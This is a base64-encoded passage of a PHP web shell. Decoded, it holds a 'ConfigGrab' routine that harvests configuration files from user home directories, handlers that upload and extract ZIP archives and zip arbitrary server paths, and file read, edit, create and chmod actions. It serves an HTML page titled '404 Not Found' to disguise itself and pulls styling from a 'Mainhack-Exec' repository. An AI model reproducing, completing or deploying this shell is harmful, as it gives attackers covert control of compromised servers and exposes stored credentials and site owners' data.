udGVudHMoJGZ1bGxDb25maWdQYXRoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkY29uZmlnQ29udGVudCAhPT0gZmFsc2UgJiYgIWVtcHR5KHRyaW0oJGNvbmZpZ0NvbnRlbnQpKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzYWZlRmlsZU5hbWUgPSBwcmVnX3JlcGxhY2UoJy9bXmEtekEtWjAtOV9cLVwuXS8nLCAnXycsICR1c2VybmFtZSAuICctJyAuICRjb25maWdUeXBlIC4gJy0nIC4gYmFzZW5hbWUoJGNvbmZpZ0ZpbGVSZWxhdGl2ZSkpIC4gJy50eHQnOyAkc2F2ZVBhdGggPSAkY29uZmlnRGlyUGF0aCAuICcvJyAuICRzYWZlRmlsZU5hbWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKEBmaWxlX3B1dF9jb250ZW50cygkc2F2ZVBhdGgsICRjb25maWdDb250ZW50KSAhPT0gZmFsc2UpIHsgQGNobW9kKCRzYXZlUGF0aCwgMDYwMCk7ICRjb25maWdGaWxlc0ZvdW5kW10gPSBodG1sc3BlY2lhbGNoYXJzKCRzYWZlRmlsZU5hbWUpOyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7IGVycm9yX2xvZygiQ29uZmlnR3JhYjogRmFpbGVkIHRvIHNhdmUgJHNhdmVQYXRoIGZvciB1c2VyICR1c2VybmFtZSIpOyB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICBAZmNsb3NlKCRldGMpOwogICAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRjb25maWdGaWxlc0ZvdW5kKSkgewogICAgICAgICAgICAgICAgICAgICAgICRyZXNwb25zZU1lc3NhZ2UgLj0gIjxwIHN0eWxlPSdjb2xvcjogZ3JlZW47Jz5Gb3VuZCBhbmQgc2F2ZWQgIiAuIGNvdW50KCRjb25maWdGaWxlc0ZvdW5kKSAuICIgcG90ZW50aWFsIGNvbmZpZyBmaWxlczo8L3A+PHVsPiI7IGZvcmVhY2ggKCRjb25maWdGaWxlc0ZvdW5kIGFzICRmb3VuZEZpbGUpIHsgJHJlc3BvbnNlTWVzc2FnZSAuPSAiPGxpPiIgLiAkZm91bmRGaWxlIC4gIjwvbGk+IjsgfSAkcmVzcG9uc2VNZXNzYWdlIC49ICI8L3VsPiI7CiAgICAgICAgICAgICAgICAgIH0gZWxzZSB7ICRyZXNwb25zZU1lc3NhZ2UgLj0gIjxwIHN0eWxlPSdjb2xvcjogb3JhbmdlOyc+U2NhbiBjb21wbGV0ZWQuIE5vIHJlYWRhYmxlIGNvbmZpZ3VyYXRpb24gZmlsZXMgZm91bmQgYmFzZWQgb24gY29tbW9uIHBhdGhzLjwvcD4iOyB9CiAgICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgJHJlc3BvbnNlTWVzc2FnZSAuPSAkZXJyb3JNZXNzYWdlOyAkZXJyb3JNZXNzYWdlID0gJyc7Cn0KCi8vIE5vdGU6IFRoaXMgc2VjdGlvbiBpcyBzdGlsbCBwcmVzZW50IGJ1dCB3b24ndCBiZSB0cmlnZ2VyZWQgYnkgdGhlIHNpbXBsaWZpZWQgVUkgZHJvcGRvd24KaWYgKGlzc2V0KCRfUE9TVFsnZXh0cmFjdC16aXAnXSkgJiYgaXNzZXQoJF9GSUxFU1snZXh0cmFjdC16aXAtZmlsZSddKSkgewogICAgIGlmICgkX0ZJTEVTWydleHRyYWN0LXppcC1maWxlJ11bJ2Vycm9yJ10gIT09IFVQTE9BRF9FUlJfT0spIHsgJGVycm9yTWVzc2FnZSA9ICdFcnJvciBkdXJpbmcgWklQIGZpbGUgdXBsb2FkOiBDb2RlICcgLiAkX0ZJTEVTWydleHRyYWN0LXppcC1maWxlJ11bJ2Vycm9yJ107IH0KICAgICBlbHNlaWYgKCFjbGFzc19leGlzdHMoJ1ppcEFyY2hpdmUnKSkgeyAkZXJyb3JNZXNzYWdlID0gJ0Vycm9yOiBaaXBBcmNoaXZlIGNsYXNzIG5vdCBmb3VuZC4gUEhQIFpJUCBleHRlbnNpb24gaXMgcmVxdWlyZWQuJzsgfQogICAgIGVsc2UgewogICAgICAgICAkZXh0cmFjdFppcEZpbGUgPSAkX0ZJTEVTWydleHRyYWN0LXppcC1maWxlJ11bJ3RtcF9uYW1lJ107ICRleHRyYWN0WmlwT3JpZ2luYWxOYW1lID0gYmFzZW5hbWUoJF9GSUxFU1snZXh0cmFjdC16aXAtZmlsZSddWyduYW1lJ10pOwogICAgICAgICAkemlwID0gbmV3IFppcEFyY2hpdmU7CiAgICAgICAgIGlmICgkemlwLT5vcGVuKCRleHRyYWN0WmlwRmlsZSkgPT09IFRSVUUpIHsKICAgICAgICAgICAgIGlmICghaXNfd3JpdGFibGUoJGN1cnJlbnREaXJlY3RvcnkpKSB7ICRlcnJvck1lc3NhZ2UgPSAnRXJyb3I6IENhbm5vdCB3cml0ZSB0byBleHRyYWN0aW9uIGRpcmVjdG9yeS4gQ2hlY2sgcGVybWlzc2lvbnMuJzsgfQogICAgICAgICAgICAgZWxzZSB7IGlmICgkemlwLT5leHRyYWN0VG8oJGN1cnJlbnREaXJlY3RvcnkpKSB7ICRyZXNwb25zZU1lc3NhZ2UgPSAnWklQIGZpbGUgIicgLiBodG1sc3BlY2lhbGNoYXJzKCRleHRyYWN0WmlwT3JpZ2luYWxOYW1lKSAuICciIGV4dHJhY3RlZCBzdWNjZXNzZnVsbHkuJzsgfSBlbHNlIHsgJGVycm9yTWVzc2FnZSA9ICdFcnJvciBleHRyYWN0aW5nIFpJUCBmaWxlLiBDaGVjayBwZXJtaXNzaW9ucyBvciBhcmNoaXZlIGludGVncml0eS4nOyB9IH0KICAgICAgICAgICAgJHppcC0+Y2xvc2UoKTsKICAgICAgICAgfSBlbHNlIHsgJGVycm9yTWVzc2FnZSA9ICdFcnJvciBvcGVuaW5nIFpJUCBmaWxlLiBJdCBtaWdodCBiZSBjb3JydXB0ZWQgb3Igbm90IGEgdmFsaWQgWklQLic7IH0KICAgICB9Cn0KCi8vIE5vdGU6IFRoaXMgc2VjdGlvbiBpcyBzdGlsbCBwcmVzZW50IGJ1dCB3b24ndCBiZSB0cmlnZ2VyZWQgYnkgdGhlIHNpbXBsaWZpZWQgVUkgZHJvcGRvd24KaWYgKGlzc2V0KCRfUE9TVFsnemlwJ10pICYmIGlzc2V0KCRfUE9TVFsnemlwLXRhcmdldCddKSkgewogICAgJGl0ZW1Ub1ppcCA9IHRyaW0oJF9QT1NUWyd6aXAtdGFyZ2V0J10pOwogICAgaWYgKGVtcHR5KCRpdGVtVG9aaXApKSB7ICRlcnJvck1lc3NhZ2UgPSAnRXJyb3I6IE5vIGZpbGUgb3IgZGlyZWN0b3J5IHNwZWNpZmllZCBmb3IgemlwcGluZy4nOyB9CiAgICBlbHNlaWYgKCFmaWxlX2V4aXN0cygkaXRlbVRvWmlwKSkgeyAkZXJyb3JNZXNzYWdlID0gJ0Vycm9yOiBTcGVjaWZpZWQgZmlsZSBvciBkaXJlY3RvcnkgZG9lcyBub3QgZXhpc3Q6ICcgLiBodG1sc3BlY2lhbGNoYXJzKGJhc2VuYW1lKCRpdGVtVG9aaXApKTsgfQogICAgZWxzZWlmICghY2xhc3NfZXhpc3RzKCdaaXBBcmNoaXZlJykpIHsgJGVycm9yTWVzc2FnZSA9ICdFcnJvcjogWmlwQXJjaGl2ZSBjbGFzcyBub3QgZm91bmQuIFBIUCBaSVAgZXh0ZW5zaW9uIGlzIHJlcXVpcmVkLic7IH0KICAgIGVsc2VpZiAoIWlzX3dyaXRhYmxlKCRjdXJyZW50RGlyZWN0b3J5KSkgeyAkZXJyb3JNZXNzYWdlID0gJ0Vycm9yOiBDYW5ub3Qgd3JpdGUgWklQIGZpbGUgdG8gY3VycmVudCBkaXJlY3RvcnkuIENoZWNrIHBlcm1pc3Npb25zLic7IH0KICAgIGVsc2UgewogICAgICAgICR6aXBGaWxlTmFtZSA9IGJhc2VuYW1lKCRpdGVtVG9aaXApIC4gJ18nIC4gZGF0ZSgnWW1kSGlzJykgLiAnLnppcCc7ICR6aXBGaWxlUGF0aCA9IHJ0cmltKCRjdXJyZW50RGlyZWN0b3J5LCAnLycpIC4gJy8nIC4gJHppcEZpbGVOYW1lOwogICAgICAgICR6aXAgPSBuZXcgWmlwQXJjaGl2ZTsKICAgICAgICBpZiAoJHppcC0+b3BlbigkemlwRmlsZVBhdGgsIFppcEFyY2hpdmU6OkNSRUFURSB8IFppcEFyY2hpdmU6Ok9WRVJXUklURSkgPT09IFRSVUUpIHsKICAgICAgICAgICAgJHN1Y2Nlc3MgPSBmYWxzZTsKICAgICAgICAgICAgaWYgKGlzX2RpcigkaXRlbVRvWmlwKSkgewogICAgICAgICAgICAgICAgJGZpbGVzID0gbmV3IFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3IoIG5ldyBSZWN1cnNpdmVEaXJlY3RvcnlJdGVyYXRvcigkaXRlbVRvWmlwLCBSZWN1cnNpdmVEaXJlY3RvcnlJdGVyYXRvcjo6U0tJUF9ET1RTKSwgUmVjdXJzaXZlSXRlcmF0b3JJdGVyYXRvcjo6U0VMRl9GSVJTVCApOwogICAgICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCEkZmlsZS0+aXNEaXIoKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGVQYXRoID0gJGZpbGUtPmdldFJlYWxQYXRoKCk7ICRyZWxhdGl2ZVBhdGggPSBzdWJzdHIoJGZpbGVQYXRoLCBzdHJsZW4ocmVhbHBhdGgoJGl0ZW1Ub1ppcCkpICsgMSk7CiAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHJlbGF0aXZlUGF0aCAhPT0gZmFsc2UpIHsgaWYgKCEkemlwLT5hZGRGaWxlKCRmaWxlUGF0aCwgJHJlbGF0aXZlUGF0aCkpIHsgJGVycm9yTWVzc2FnZSA9ICdFcnJvciBhZGRpbmcgZmlsZSB0byBaSVA6ICcgLiBodG1sc3BlY2lhbGNoYXJzKCRyZWxhdGl2ZVBhdGgpOyAkc3VjY2VzcyA9IGZhbHNlOyBicmVhazsgfSBlbHNlIHsgJHN1Y2Nlc3MgPSB0cnVlOyB9IH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZWlmIChpc19maWxlKCRpdGVtVG9aaXApKSB7IGlmICgkemlwLT5hZGRGaWxlKCRpdGVtVG9aaXAsIGJhc2VuYW1lKCRpdGVtVG9aaXApKSkgeyAkc3VjY2VzcyA9IHRydWU7IH0gZWxzZSB7ICRlcnJvck1lc3NhZ2UgPSAnRXJyb3IgYWRkaW5nIGZpbGUgdG8gWklQOiAnIC4gaHRtbHNwZWNpYWxjaGFycyhiYXNlbmFtZSgkaXRlbVRvWmlwKSk7ICRzdWNjZXNzID0gZmFsc2U7IH0gfQogICAgICAgICAgICBpZiAoJHppcC0+Y2xvc2UoKSkgewogICAgICAgICAgICAgICAgIGlmICgkc3VjY2VzcykgeyAkcmVzcG9uc2VNZXNzYWdlID0gJ0l0ZW0gemlwcGVkIHN1Y2Nlc3NmdWxseTogPGEgaHJlZj0iP2Rpcj0nIC4gdXJsZW5jb2RlKCRjdXJyZW50RGlyZWN0b3J5KSAuICcmcmVhZD0nIC4gdXJsZW5jb2RlKCR6aXBGaWxlUGF0aCkgLiAnIj4nIC4gaHRtbHNwZWNpYWxjaGFycygkemlwRmlsZU5hbWUpIC4gJzwvYT4nOyB9CiAgICAgICAgICAgICAgICAgZWxzZWlmIChlbXB0eSgkZXJyb3JNZXNzYWdlKSkgeyAkZXJyb3JNZXNzYWdlID0gJ1NwZWNpZmllZCBpdGVtIHdhcyBlbXB0eSBvciBjb3VsZCBub3QgYmUgemlwcGVkLic7IEB1bmxpbmsoJHppcEZpbGVQYXRoKTsgfQogICAgICAgICAgICAgICAgIGVsc2UgeyBAdW5saW5rKCR6aXBGaWxlUGF0aCk7IH0KICAgICAgICAgICAgfSBlbHNlIHsgJGVycm9yTWVzc2FnZSA9ICdFcnJvciBjbG9zaW5nIHRoZSBaSVAgYXJjaGl2ZS4nOyBAdW5saW5rKCR6aXBGaWxlUGF0aCk7IH0KICAgICAgICB9IGVsc2UgeyAkZXJyb3JNZXNzYWdlID0gJ0Vycm9yIGNyZWF0aW5nIFpJUCBhcmNoaXZlIGZpbGUuIENoZWNrIHBlcm1pc3Npb25zLic7IH0KICAgIH0KfQoKaWYgKGlzc2V0KCRfR0VUWydyZXNwb25zZSddKSkgeyAkcmVzcG9uc2VNZXNzYWdlID0gaHRtbHNwZWNpYWxjaGFycyh1cmxkZWNvZGUoJF9HRVRbJ3Jlc3BvbnNlJ10pKTsgfQppZiAoaXNzZXQoJF9HRVRbJ2Vycm9yJ10pKSB7ICRlcnJvck1lc3NhZ2UgPSBodG1sc3BlY2lhbGNoYXJzKHVybGRlY29kZSgkX0dFVFsnZXJyb3InXSkpOyB9CgokaXNBY3Rpb25WaWV3ID0gaXNzZXQoJF9HRVRbJ3JlYWQnXSkgfHwgaXNzZXQoJF9HRVRbJ2dhcyddKSB8fCBpc3NldCgkX0dFVFsnZG8nXSkgfHwgaXNzZXQoJF9HRVRbJ2NyZWF0ZSddKSB8fCBpc3NldCgkX0dFVFsnZWRpdCddKSB8fCBpc3NldCgkX0dFVFsnY2htb2QnXSkgfHwgaXNzZXQoJF9HRVRbJ2hhaGF5J10pOwoKJGN1cnJlbnRIb3VyID0gKGludClkYXRlKCdHJyk7CiRkYXJrTW9kZVN0YXJ0SG91ciA9IDE4OyAkZGFya01vZGVFbmRIb3VyID0gNjsKJGlzRGFya01vZGUgPSAoJGN1cnJlbnRIb3VyID49ICRkYXJrTW9kZVN0YXJ0SG91ciB8fCAkY3VycmVudEhvdXIgPCAkZGFya01vZGVFbmRIb3VyKTsKJGJvZHlDbGFzcyA9ICRpc0RhcmtNb2RlID8gJ2RhcmstbW9kZScgOiAnJzsKPz4KPCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT40MDQgTm90IEZvdW5kPC90aXRsZT4gPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL3Jhdy5naXRoYWNrLmNvbS9NYWluaGFjay1FeGVjL21haW5oYWNrL3JlZnMvaGVhZHMvbWFpbi9HRy5jc3MiPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgeyBmb250LWZhbWlseTogc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1jb2xvcjogI2Y0ZjRmNDsgY29sb3I6ICMzMzM7IG1hcmdpbjogMDsgfQogICAgICAgIC5jb250YWluZXIgeyBtYXgtd2lkdGg6IDEwMDBweDsgbWFyZ2luOiAxNXB4IGF1dG87IGJhY2tncm91bmQ6ICNmZmY7IHBhZGRpbmc6IDIwcHg7IGJvcmRlci1yYWRpdXM6IDVweDsgYm94LXNoYWRvdzogMCAwIDEwcHggcmdiYSgwLDAsMCwwLjEpOyB9CiAgICAgICAgaDEsIGgyLCBoMyB7IGNvbG9yOiAjNTU1OyB9CiAgICAgICAgaHIgeyBib3JkZXI6IDA7IGJvcmRlci10b3A6IDFweCBzb2xpZCAjZWVlOyBtYXJnaW46IDIwcHggMDsgfQogICAgICAgIHRhYmxlIHsgd2lkdGg6IDEwMCU7IGJvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7IG1hcmdpbi10b3A6IDE1cHg7IH0KICAgICAgICB0aCwgdGQgeyBwYWRkaW5nOiA4cHggMTJweDsgYm9yZGVyOiAxcHggc29saWQgI2RkZDsgdGV4dC1hbGlnbjogbGVmdDsgdmVydGljYWwtYWxpZ246IG1pZGRsZTsgfQogICAgICAgIHRoIHsgYmFja2dyb3VuZC1jb2xvcjogI2Y5ZjlmOTsgfQogICAgICAgIHRyOm50aC1jaGlsZChldmVuKSB7IGJhY2tncm91bmQtY29sb3I6ICNmZGZkZmQ7IH0KICAgICAgICBhIHsgY29sb3I6ICMwMDdiZmY7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgfQogICAgICAgIGE6aG92ZXIgeyB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsgfQogICAgICAgIC5idXR0b24sIGlucHV0W3R5cGU9InN1Ym1pdCJdLCBpbnB1dFt0eXBlPSJidXR0b24iXSwgc2VsZWN0LCAuc3VtbW9uLWJ1dHRvbiB7IGJhY2tncm91bmQtY29sb3I6ICMwMDdiZmY7IGNvbG9yOiB3aGl0ZTsgcGFkZGluZzogOHB4IDE1cHg7IGJvcmRlcjogbm9uZTsgYm9yZGVyLXJhZGl1czogM3B4OyBjdXJzb3I6IHBvaW50ZXI7IGZvbnQtc2l6ZTogMTRweDsgbWFyZ2luOiAycHg7IHZlcnRpY2FsLWFsaWduOiBtaWRkbGU7IH0KICAgICAgICAuYnV0dG9uOmhvdmVyLCBpbnB1dFt0eXBlPSJzdWJtaXQiXTpob3ZlciwgaW5wdXRbdHlwZT0iYnV0dG9uIl06aG92ZXIsIHNlbGVjdDpob3ZlciwgLnN1bW1vbi1idXR0b246aG92ZXIgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA1NmIzOyB9CiAgICAgICAgaW5wdXRbdHlwZT0idGV4dCJdLCBpbnB1dFt0eXBlPSJmaWxlIl0sIHRleHRhcmVhLCBzZWxlY3QgeyBwYWRkaW5nOiA4cHg7IGJvcmRlcjogMXB4IHNvbGlkICNjY2M7IGJvcmRlci1yYWRpdXM6IDNweDsgbWFyZ2luOiAycHg7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IGZvbnQtc2l6ZTogMTRweDsgfQogICAgICAgIGlucHV0W3R5cGU9ImZpbGUiXSB7IHBhZGRpbmc6IDVweDsgfQogICAgICAgIC5jb21tYW5kLW91dHB1dCwgLmVkaXQtZmlsZSwgLmNoYW5nZS1wZXJtaXNzaW9uLCAucmVuYW1lLWZvcm0sIC5leHRyYWN0LXppcC1mb3JtIHsgYmFja2dyb3VuZDogI2VlZTsgYm9yZGVyOiAxcHggc29saWQgI2NjYzsgcGFkZGluZzogMTVweDsgbWFyZ2luLXRvcDogMTVweDsgYm9yZGVyLXJhZGl1czogM3B4OyBvdmVyZmxvdy14OiBhdXRvOyB9CiAgICAgICAgLmNvbW1hbmQtb3V0cHV0IHByZSwgLmVkaXQtZmlsZSB0ZXh0YXJlYSB7IHdoaXRlLXNwYWNlOiBwcmUtd3JhcDsgd29yZC13cmFwOiBicmVhay13b3JkOyBmb250LWZhbWlseTogbW9ub3NwYWNlOyBmb250LXNpemU6IDEzcHg7IGNvbG9yOiAjMjIyOyB9CiAgICAgICAgLmVkaXQtZmlsZSB0ZXh0YXJlYSB7IHdpZHRoOiAxMDAlOyBtaW4taGVpZ2h0OiA0MDBweDsgcmVzaXplOiB2ZXJ0aWNhbDsgfQogICAgICAgIC5icmVhZGNydW1iIHsgbWFyZ2luLWJvdHRvbTogMTVweDsgZm9udC1zaXplOiAxNHB4OyBiYWNrZ3JvdW5kOiAjZWVlOyBwYWRkaW5nOiA4cHg7IGJvcmRlci1yYWRpdXM6IDNweDsgfQogICAgICAgIC5icmVhZGNydW1iIGEgeyBtYXJnaW46IDAgMnB4OyB9CiAgICAgICAgLnJlc3BvbnNlLW1lc3NhZ2UgeyBjb2xvcjogZ3JlZW47IGZvbnQtd2VpZ2h0OiBib2xkOyBtYXJnaW4tdG9wOiAxMHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiAjZTZmZmVkOyBib3JkZXI6IDFweCBzb2xpZCAjYjNmZmM2OyBwYWRkaW5nOiAxMHB4OyBib3JkZXItcmFkaXVzOiAzcHg7IH0KICAgICAgICAuZXJyb3ItbWVzc2FnZSB7IGNvbG9yOiByZWQ7IGZvbnQtd2VpZ2h0OiBib2xkOyBtYXJnaW4tdG9wOiAxMHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZlNmU2OyBib3JkZXI6IDFweCBzb2xpZCAjZmZiM2IzOyBwYWRkaW5nOiAxMHB4OyBib3JkZXItcmFkaXVzOiAzcHg7IH0KICAgICAgICAudXBsb2FkLWNtZC1jb250YWluZXIgeyBkaXNwbGF5OiBmbGV4OyBqdXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47IGZsZXgtd3JhcDogd3JhcDsgZ2FwOiAyMHB4OyBtYXJnaW4tdG9wOiAxNXB4OyB9CiAgICAgICAgLnVwbG9hZC1mb3JtLCAuY21kLWZvcm0geyBmbGV4OiAxOyBtaW4td2lkdGg6IDMwMHB4OyB9CiAgICAgICAgLmNtZC1mb3JtIGlucHV0W3R5cGU9InRleHQiXSB7IHdpZHRoOiBjYWxjKDEwMCUgLSAxMDBweCk7IH0KICAgICAgICAuZW1wdHktYnV0dG9uIHsgZGlzcGxheTogbm9uZTsgfQogICAgICAgIC5kcm9wZG93biBzZWxlY3QgeyBwYWRkaW5nOiA1cHggOHB4OyB9CiAgICAgICAgLmZvb3RlciB7IHRleHQtYWxpZ246IGNlbnRlcjsgbWFyZ2luLXRvcDogMjBweDsgZm9udC1zaXplOiAxMnB4OyBjb2xvcjogIzg4ODsgfQogICAgICAgIC5mb290ZXIgYSB7IGNvbG9yOiAjNjY2OyB9CiAgICAgICAgLnNpZGViYXIgeyBwb3NpdGlvbjogZml4ZWQ7IHRvcDogMDsgcmlnaHQ6IC0zNTBweDsgd2lkdGg6IDMwMHB4OyBoZWlnaHQ6IDEwMCU7IGJhY2tncm91bmQtY29sb3I6ICNmOGY5ZmE7IGJvcmRlci1sZWZ0OiAxcHggc29saWQgI2RlZTJlNjsgYm94LXNoYWRvdzogLTJweCAwIDVweCByZ2JhKDAsMCwwLDAuMSk7IHRyYW5zaXRpb246IHJpZ2h0IDAuM3MgZWFzZTsgei1pbmRleDogMTAwMDsgb3ZlcmZsb3cteTogYXV0bzsgcGFkZGluZzogMTVweDsgfQogICAgICAgIC5zaWRlYmFyLm9wZW4geyByaWdodDogMDsgfQogICAgICAgIC5zaWRlYmFyLWNvbnRlbnQgeyB9CiAgICAgICAgLnNpZGViYXItY2xvc2UgeyB0ZXh0LWFsaWduOiByaWdodDsgbWFyZ2luLWJvdHRvbTogMTVweDsgfQogICAgICAgIC5zaWRlYmFyLWNsb3NlIGJ1dHRvbiB7IGJhY2tncm91bmQ6ICNkYzM1NDU7IGNvbG9yOiB3aGl0ZTsgcGFkZGluZzogNXB4IDEwcHg7IH0KICAgICAgICAuaW5mby1jb250YWluZXIgeyBtYXJnaW4tYm90dG9tOiAyMHB4OyB9CiAgICAgICAgLmluZm8tY29udGFpbmVyIGgyIHsgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICNlZWU7IHBhZGRpbmctYm90dG9tOiA1cHg7IG1hcmdpbi1ib3R0b206IDEwcHg7IGZvbnQtc2l6ZTogMS4xZW07IH0KICAgICAgICAuaW5mby1saXN0IHsgbGlzdC1zdHlsZTogbm9uZTsgcGFkZGluZzogMDsgbWFyZ2luOiAwOyBmb250LXNpemU6IDAuOWVtOyB9CiAgICAgICAgLmluZm8tbGlzdCBsaSB7IG1hcmdpbi1ib3R0b206IDhweDsgd29yZC13cmFwOiBicmVhay13b3JkOyB9CiAgICAgICAgLmluZm8tbGlzdCBsaSBzZWxlY3QgeyB3aWR0aDogMTAwJTsgfQogICAgICAgIC5tZW51LWljb24geyBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7IGN1cnNvcjogcG9pbnRlcjsgcGFkZGluZzogMTBweDsgbWFyZ2luLWxlZnQ6IDE1cHg7IHZlcnRpY2FsLWFsaWduOiBtaWRkbGU7IH0KICAgICAgICAgLm1lbnUtaWNvbjo6YmVmb3JlIHsgY29udGVudDogJ1wyNjMwJzsgZm9udC1zaXplOiAyMHB4OyB9CiAgICAgICAgLmRhcmstbW9kZSB7IGJhY2tncm91bmQtY29sb3I6ICMxYTFhMWE7IGNvbG9yOiAjZTBlMGUwOyB9CiAgICAgICAgLmRhcmstbW9kZSAuY29udGFpbmVyIHsgYmFja2dyb3VuZDogIzJiMmIyYjsgYm94LXNoYWRvdzogMCAwIDEwcHggcmdiYSgwLDAsMCwwLjUpOyBib3JkZXI6IDFweCBzb2xpZCAjNDQ0OyB9CiAgICAgICAgLmRhcmstbW9kZSBoMSwgLmRhcmstbW9kZSBoMiwgLmRhcmstbW9kZSBoMyB7IGNvbG9yOiAjY2NjY2NjOyB9CiAgICAgICAgLmRhcmstbW9kZSBoMSBhIHNwYW4geyBjb2xvcjogIzMzY2MzMyAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRhcmstbW9kZSBociB7IGJvcmRlci10b3A6IDFweCBzb2xpZCAjNDQ0OyB9CiAgICAgICAgLmRhcmstbW9kZSB0YWJsZSB7IGJvcmRlcjogMXB4IHNvbGlkICM1NTU7IH0KICAgICAgICAuZGFyay1tb2RlIHRoLCAuZGFyay1tb2RlIHRkIHsgYm9yZGVyOiAxcHggc29saWQgIzU1NTsgfQogICAgICAgIC5kYXJrLW1vZGUgdGggeyBiYWNrZ3JvdW5kLWNvbG9yOiAjM2EzYTNhOyBjb2xvcjogI2UwZTBlMDsgfQogICAgICAgIC5kYXJrLW1vZGUgdHI6bnRoLWNoaWxkKGV2ZW4pIHsgYmFja2dyb3VuZC1jb2xvcjogIzMwMzAzMDsgfQogICAgICAgICAuZGFyay1tb2RlIHRyOmhvdmVyIHsgYmFja2dyb3VuZC1jb2xvcjogIzQwNDA0MDsgfQogICAgICAgIC5kYXJrLW1vZGUgYSB7IGNvbG9yOiAjNjZiM2ZmOyB9CiAgICAgICAgLmRhcmstbW9kZSBhOmhvdmVyIHsgY29sb3I6ICM5OWNjZmY7IH0KICAgICAgICAgLmRhcmstbW9kZSAuYnV0dG9uLCAuZGFyay1tb2RlIGlucHV0W3R5cGU9InN1Ym1pdCJdLCAuZGFyay1tb2RlIGlucHV0W3R5cGU9ImJ1dHRvbiJdLCAuZGFyay1tb2RlIHNlbGVjdCwgLmRhcmstbW9kZSAuc3VtbW9uLWJ1dHRvbiB7IGJhY2tncm91bmQtY29sb3I6ICMwMDU2YjM7IGNvbG9yOiAjZmZmZmZmOyBib3JkZXI6IDFweCBzb2xpZCAjMDA0MDgwOyB9CiAgICAgICAgLmRhcmstbW9kZSAuYnV0dG9uOmhvdmVyLCAuZGFyay1tb2RlIGlucHV0W3R5cGU9InN1Ym1pdCJdOmhvdmVyLCAuZGFyay1tb2RlIGlucHV0W3R5cGU9ImJ1dHRvbiJdOmhvdmVyLCAuZGFyay1tb2RlIHNlbGVjdDpob3ZlciwgLmRhcmstbW9kZSAuc3VtbW9uLWJ1dHRvbjpob3ZlciB7IGJhY2tncm91bmQtY29sb3I6ICMwMDQwODA7IGJvcmRlci1jb2xvcjogIzAwMmE1MzsgfQogICAgICAgIC5kYXJrLW1vZGUgaW5wdXRbdHlwZT0idGV4dCJdLCAuZGFyay1tb2RlIGlucHV0W3R5cGU9ImZpbGUiXSwgLmRhcmstbW9kZSB0ZXh0YXJlYSwgLmRhcmstbW9kZSBzZWxlY3QgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMzMzOyBjb2xvcjogI2UwZTBlMDsgYm9yZGVyOiAxcHggc29saWQgIzY2NjsgfQogICAgICAgIC5kYXJrLW1vZGUgaW5wdXRbdHlwZT0iZmlsZSJdIHsgY29sb3Itc2NoZW1lOiBkYXJrOyB9CiAgICAgICAgLmRhcmstbW9kZSAuY29tbWFuZC1vdXRwdXQsIC5kYXJrLW1vZGUgLmVkaXQtZmlsZSwgLmRhcmstbW9kZSAuY2hhbmdlLXBlcm1pc3Npb24sIC5kYXJrLW1vZGUgLnJlbmFtZS1mb3JtLCAuZGFyay1tb2RlIC5leHRyYWN0LXppcC1mb3JtIHsgYmFja2dyb3VuZDogIzNhM2EzYTsgYm9yZGVyOiAxcHggc29saWQgIzU1NTsgY29sb3I6ICNlMGUwZTA7IH0KICAgICAgICAuZGFyay1tb2RlIC5jb21tYW5kLW91dHB1dCBwcmUsIC5kYXJrLW1vZGUgLmVkaXQtZmlsZSB0ZXh0YXJlYSB7IGNvbG9yOiAjZTBlMGUwOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMjgyODI4OyB9CiAgICAgICAgIC5kYXJrLW1vZGUgLmJyZWFkY3J1bWIgeyBiYWNrZ3JvdW5kOiAjM2EzYTNhOyBjb2xvcjogI2NjYzsgYm9yZGVyOiAxcHggc29saWQgIzU1NTsgfQogICAgICAgIC5kYXJrLW1vZGUgLnJlc3BvbnNlLW1lc3NhZ2UgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMWE0ZDJlOyBib3JkZXItY29sb3I6ICMyYTZkNGU7IGNvbG9yOiAjYzhlNmM5OyB9CiAgICAgICAgLmRhcmstbW9kZSAuZXJyb3ItbWVzc2FnZSB7IGJhY2tncm91bmQtY29sb3I6ICM2MTFhMWE7IGJvcmRlci1jb2xvcjogIzhkMmEyYTsgY29sb3I6ICNmZmNkZDI7IH0K